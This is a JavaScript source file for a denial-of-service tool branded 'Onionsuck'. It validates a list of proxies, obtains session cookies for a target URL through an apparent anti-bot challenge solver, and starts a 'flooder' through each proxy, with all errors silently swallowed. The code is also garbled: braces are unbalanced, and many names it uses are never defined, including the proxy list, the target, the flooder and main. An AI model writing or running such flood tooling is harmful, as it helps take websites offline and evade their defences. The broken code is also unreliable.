process.on('uncaughtException', function(er) {
});
process.on('unhandledRejection', function(er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;

const { solverInstance } = require('./engine');
const { spawn } = require('child_process');

const fs = require('fs');
const colors = require('colors');
const request = require("request");
const validProxies = [];


function randPrx() {
	return proxies[Math.floor(Math.random() * proxies.length)];
}

function log(string) {
	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
	console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
}

function check_proxy(proxy) {
	request({
		url: "https://www.google.com/",
		proxy: "http://" + proxy,
		}
	}, (err, res, body) => {
		if (!err) {
			validProxies.push(proxy);
			log('['.red + 'Onion'.white + 'suck'.red + '] '.white + ` Added new proxy: `.red + ` ${proxy}`.white);
		}
	});
}

async function sessionIn() {
	validProxies.forEach((e) => {
			solverInstance({
				"Target": urlT,
				"Proxy": e
		}).then((cookie, _) => {
			log('['.red + 'Onion'.white + 'suck'.red + '] '.white + ' Flooder started'.red + '->'.white + ` ${cookie}`.red + ' ->'.white + ` ${e}`.red);
			flooder(cookie, e)
		}).catch((ee) => {
			log(ee);
		})
	})
}

setTimeout(() => {
		return sessionIn();
	}, 15 * 1000);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
}, timeT * 1000)

// sessionIn();
